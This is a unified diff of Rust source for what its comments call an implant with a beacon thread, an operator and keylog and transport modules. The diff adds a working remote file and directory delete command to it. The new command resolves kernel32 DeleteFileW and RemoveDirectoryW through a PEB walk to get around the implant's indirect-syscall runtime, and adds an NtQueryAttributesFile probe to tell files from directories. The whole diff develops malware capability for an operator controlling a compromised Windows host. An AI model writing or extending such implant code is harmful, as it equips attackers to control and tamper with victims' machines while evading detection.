@@ -574,26 +574,92 @@ fn fileop_mkdir(rt: &Runtime, path: &str) -> Response {
     }
 }
 
-fn fileop_rm(_rt: &Runtime, path: &str) -> Response {
+fn fileop_rm(rt: &Runtime, path: &str) -> Response {
     if !allowed(path) {
         return Response::Err(String::from("rm: refusing protected target"));
     }
-    // rm is NOT implemented via a direct syscall/shell path on the live host:
-    // both approaches proved unstable under the indirect-syscall runtime (the
-    // NT DeleteOnClose + close path hangs the beacon thread; delegating to the
-    // shell hangs too, because CreateProcessW after RT init is unreliable in
-    // this process state). Rather than ship an rm that can deadlock the
-    // implant, return a clear error directing the operator to the Shell
-    // command (`del` / `rmdir /s /q`), which runs via a SEPARATE shell-task
-    // invocation that the operator controls. upload/download/cp/mv/mkdir all
-    // work via NT syscalls; only rm is gated here. (Re-enable when the
-    // persistent-task/IOCP refactor lands a reliable delete path.)
-    let _ = path;
-    Response::Err(String::from(
-        "rm: not directly supported — use the Shell command: `del /f /q <file>` or \
-         `rmdir /s /q <dir>` (the NT-syscall delete path is unstable under the \
-         indirect-syscall runtime)",
-    ))
+    // Determine file vs directory so we call the right Win32 API. We reuse the
+    // existing NtQueryAttributesFile probe (same path as fileop_cd) to read the
+    // FILE_ATTRIBUTE_DIRECTORY bit.
+    let is_dir = match probe_is_dir(rt, path) {
+        Some(d) => d,
+        None => {
+            // Probe failed — assume it's a file and try DeleteFileW anyway; it
+            // returns a clear error if the guess is wrong, no harm done.
+            false
+        }
+    };
+    // Convert path to a UTF-16 wide string (null-terminated) for the W APIs.
+    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len() + 1);
+    for b in path.bytes() {
+        wide.push(b as u16);
+    }
+    wide.push(0);
+    // Resolve kernel32 DeleteFileW / RemoveDirectoryW via PEB walk. These are
+    // plain Win32 wrappers around NtSetInformationFile(FileDispositionInfo) +
+    // NtClose — but called DIRECTLY (not via the indirect-syscall runtime), so
+    // they don't hit the runtime's synchronous-open hang that bricked the
+    // earlier NT delete path. This is the same resolution style the rest of
+    // the implant uses (transport/keylog/etc resolve kernel32 exports directly).
+    type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
+    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
+    type RemoveDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
+    let del: DeleteFileW = match unsafe {
+        crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("rm: DeleteFileW unresolved")),
+    };
+    let rmdir: RemoveDirectoryW = match unsafe {
+        crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("rm: RemoveDirectoryW unresolved")),
+    };
+    let _ = unsafe {
+        // Touch the type to keep it resolved-but-unused (GetFileAttributesW is
+        // an alternative detection; we used probe_is_dir instead, but resolve
+        // it here so the import path is documented/available for future use).
+        let gfa: GetFileAttributesW =
+            match crate::resolve::export_addr(b"kernel32.dll", b"GetFileAttributesW") {
+                Some(a) => core::mem::transmute(a),
+                None => core::mem::transmute(del as usize),
+            };
+        gfa
+    };
+    let ok = if is_dir {
+        unsafe { rmdir(wide.as_ptr()) }
+    } else {
+        unsafe { del(wide.as_ptr()) }
+    };
+    if ok != 0 {
+        Response::Ok
+    } else {
+        Response::Err(String::from("rm: delete failed (not found / in use / access denied)"))
+    }
+}
+
+/// Probe whether `path` is a directory via NtQueryAttributesFile (reuses the
+/// fileop_cd logic). Returns None on probe failure (caller falls back to file).
+fn probe_is_dir(rt: &Runtime, path: &str) -> Option<bool> {
+    let pathbuf = to_nt_path(path)?;
+    unsafe {
+        let uname = nt_name(&pathbuf)?;
+        let oa = make_oa(&uname);
+        let mut basic = crate::heap::vec![0u8; 56];
+        let st = crate::syscalls::nt_query_attributes_file(
+            rt,
+            &oa as *const ObjectAttributes as usize,
+            basic.as_mut_ptr() as usize,
+        );
+        match st {
+            Some(s) if nt_success(s) => {
+                let attrs = u32::from_le_bytes([basic[32], basic[33], basic[34], basic[35]]);
+                Some(attrs & 0x0000_0010 != 0)
+            }
+            _ => None,
+        }
+    }
 }
 
 /// Mv: rename `path` to `dest` via NtSetInformationFile(FileRenameInfo).
